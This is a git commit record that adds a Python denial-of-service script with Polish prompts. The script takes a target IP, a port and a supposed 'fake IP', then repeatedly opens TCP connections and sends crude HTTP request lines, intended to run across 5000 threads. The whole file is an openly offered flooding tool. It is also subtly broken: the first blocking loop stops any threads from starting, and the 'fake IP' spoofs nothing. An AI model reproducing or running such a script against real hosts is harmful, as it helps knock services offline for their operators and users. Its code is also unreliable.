9ab505c108476331bdc069aaa78bd670c0426c84
*Frezo* <wilczewski.dominik@gmail.com>
2020-11-30 23:36:32 +0100

    Create DDOS-scp.py

---
+++ DDOS-scp.py
@@ -0,0 +1,25 @@
+import threading
+import socket
+from pyfiglet import Figlet
+from colorama import *
+
+f = Figlet(font='slant')
+print(Fore.MAGENTA + f.renderText('DDOS SCRIPT'))
+
+target = input('Podaj ip: ')
+port = int(input('Podaj port: '))
+fake_ip = input('Podaj sztuczne ip: ')
+
+def ddos():
+    while True:
+        ### atak na TCP ###
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'), (target, port)) ### wysylanie zapytan
+        s.sendto(('HOST /' + fake_ip + ' \r\n\r\n').encode('ascii'), (target, port))   ### wysylanie zapytan
+        s.close()
+
+for i in range(5000):
+    ddos()
+    thread = threading.Thread(target=ddos)
+    thread.start()
